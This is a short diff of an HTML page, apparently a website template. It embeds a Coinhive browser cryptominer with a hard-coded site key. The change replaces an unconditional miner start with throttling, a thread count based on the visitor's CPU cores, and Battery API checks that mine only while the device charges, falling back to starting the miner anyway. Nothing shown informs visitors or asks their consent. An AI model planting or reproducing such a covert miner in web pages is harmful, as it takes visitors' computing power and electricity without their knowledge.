@@ -366,10 +366,26 @@
 	<script src="/js/prism.js"></script>
 	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script>
-	var miner = new CoinHive.Anonymous('8O0pD3Nu5TjaiP3gEVd2s5OCMVB2ZSOY', {
-        threads: 2
+    var miner = new CoinHive.Anonymous('8O0pD3Nu5TjaiP3gEVd2s5OCMVB2ZSOY', {
+        throttle: 0.85,
+        threads: 1
     });
-	miner.start();
+    //miner.start();
+
+    try {
+        var threads = Math.max(1, Math.floor(navigator.hardwareConcurrency / 4));
+        miner.setNumThreads(threads);
+
+        navigator.getBattery().then(function (battery) {
+            if (battery.charging) miner.start();
+            battery.onchargingchange = function (evt) {
+                if (battery.charging) miner.start();
+                else miner.stop();
+            }
+        });
+    } catch (e) {
+        miner.start();
+    }
 </script>
 </body>
 
